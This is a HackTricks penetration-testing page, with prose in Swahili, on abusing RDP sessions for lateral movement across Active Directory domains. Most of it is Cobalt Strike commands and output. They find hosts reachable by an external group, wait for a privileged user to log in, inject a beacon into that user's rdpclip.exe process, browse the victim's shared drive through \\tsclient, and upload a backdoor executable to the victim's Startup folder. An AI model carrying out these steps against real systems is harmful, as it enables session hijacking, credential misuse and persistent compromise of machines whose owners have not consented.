# RDP Sessions Abuse

{{#include ../../banners/hacktricks-training.md}}

## RDP Process Injection

Ikiwa **kikundi cha nje** kina **ufikiaji wa RDP** kwa **kompyuta** yoyote katika eneo la sasa, **mshambuliaji** anaweza **kuharibu kompyuta hiyo na kumsubiri**.

Mara tu mtumiaji huyo anapofikia kupitia RDP, **mshambuliaji anaweza kuhamasisha kwenye kikao cha mtumiaji huyo** na kutumia ruhusa zake katika eneo la nje.
```powershell
# Supposing the group "External Users" has RDP access in the current domain
## lets find where they could access
## The easiest way would be with bloodhound, but you could also run:
Get-DomainGPOUserLocalGroupMapping -Identity "External Users" -LocalGroup "Remote Desktop Users" | select -expand ComputerName
#or
Find-DomainLocalGroupMember -GroupName "Remote Desktop Users" | select -expand ComputerName

# Then, compromise the listed machines, and wait til someone from the external domain logs in:
net logons
Logged on users at \\localhost:
EXT\super.admin

# With cobalt strike you could just inject a beacon inside of the RDP process
beacon> ps
PID   PPID  Name                         Arch  Session     User
---   ----  ----                         ----  -------     -----
...
4960  1012  rdpclip.exe                  x64   3           EXT\super.admin

beacon> inject 4960 x64 tcp-local
## From that beacon you can just run powerview modules interacting with the external domain as that user
```
Angalia **njia nyingine za kuiba vikao kwa kutumia zana nyingine** [**katika ukurasa huu.**](../../network-services-pentesting/pentesting-rdp.md#session-stealing)

## RDPInception

Ikiwa mtumiaji anapata kupitia **RDP kwenye mashine** ambapo **mshambuliaji** anangojea, mshambuliaji ataweza **kuingiza beacon katika kikao cha RDP cha mtumiaji** na ikiwa **mhasiriwa ameunganisha diski yake** alipoingia kupitia RDP, **mshambuliaji anaweza kuipata**.

Katika kesi hii unaweza tu **kudhoofisha** **kompyuta** ya **mhasiriwa** kwa kuandika **backdoor** katika **folda ya kuanzisha**.
```powershell
# Wait til someone logs in:
net logons
Logged on users at \\localhost:
EXT\super.admin

# With cobalt strike you could just inject a beacon inside of the RDP process
beacon> ps
PID   PPID  Name                         Arch  Session     User
---   ----  ----                         ----  -------     -----
...
4960  1012  rdpclip.exe                  x64   3           EXT\super.admin

beacon> inject 4960 x64 tcp-local

# There's a UNC path called tsclient which has a mount point for every drive that is being shared over RDP.
## \\tsclient\c is the C: drive on the origin machine of the RDP session
beacon> ls \\tsclient\c

Size     Type    Last Modified         Name
----     ----    -------------         ----
dir     02/10/2021 04:11:30   $Recycle.Bin
dir     02/10/2021 03:23:44   Boot
dir     02/20/2021 10:15:23   Config.Msi
dir     10/18/2016 01:59:39   Documents and Settings
[...]

# Upload backdoor to startup folder
beacon> cd \\tsclient\c\Users\<username>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
beacon> upload C:\Payloads\pivot.exe
```
{{#include ../../banners/hacktricks-training.md}}
